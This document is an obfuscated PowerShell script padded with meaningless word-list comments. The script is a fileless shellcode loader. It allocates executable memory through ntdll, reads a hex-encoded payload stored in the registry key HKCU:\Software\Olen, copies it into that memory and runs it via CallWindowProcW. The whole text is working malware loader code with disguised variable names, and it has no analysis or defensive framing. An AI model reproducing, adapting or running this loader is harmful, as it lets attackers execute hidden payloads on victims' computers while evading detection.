#Elektris MARTIALIN BLUFFE FARMEREN Spilo6 TICKT NOTEKI Nabor MRSKMATER SEJRSGLD KERATOL HOSENAFH Brigalowu resubscrib UNDISC 

Add-Type -TypeDefinition @"

using System;

using System.Runtime.InteropServices;

public static class TILLGS1

{

[DllImport("ntdll.dll")]public static extern int NtAllocateVirtualMemory(int TILLGS6,ref Int32 Proso,int HOVEDS,ref Int32 TILLGS,int privaci,int TILLGS7);

[DllImport("user32.dll")]public static extern IntPtr CallWindowProcW(uint HOVEDS5,int HOVEDS6,int HOVEDS7,int HOVEDS8,int HOVEDS9);

[DllImport("kernel32.dll")]public static extern void RtlMoveMemory(IntPtr HOVEDS1,ref Int32 HOVEDS2,int HOVEDS3);

}

"@

#Carbol telegra overfl opti soul Terminspr klukke Mate6 Stum6 MILIU Over SLGTSP Bughu Tenst6  

$TILLGS3=0;

$TILLGS9=1048576;

$TILLGS8=[TILLGS1]::NtAllocateVirtualMemory(-1,[ref]$TILLGS3,0,[ref]$TILLGS9,12288,64)

$Oreadss=(Get-ItemProperty -Path "HKCU:\Software\Olen").Olen



$Unde = [System.Byte[]]::CreateInstance([System.Byte],$Oreadss.Length / 2)







For($i=0; $i -lt $Oreadss.Length; $i+=2)

	{

        $Unde[$i/2] = [convert]::ToByte($Oreadss.Substring($i, 2), 16)

    }





for($SAMLELINS=0; $SAMLELINS -lt $Unde.count ; $SAMLELINS++)

{

	

[TILLGS1]::RtlMoveMemory($TILLGS3+$SAMLELINS,[ref]$Unde[$SAMLELINS],1)



}

[TILLGS1]::CallWindowProcW($TILLGS3, 0,0,0,0)





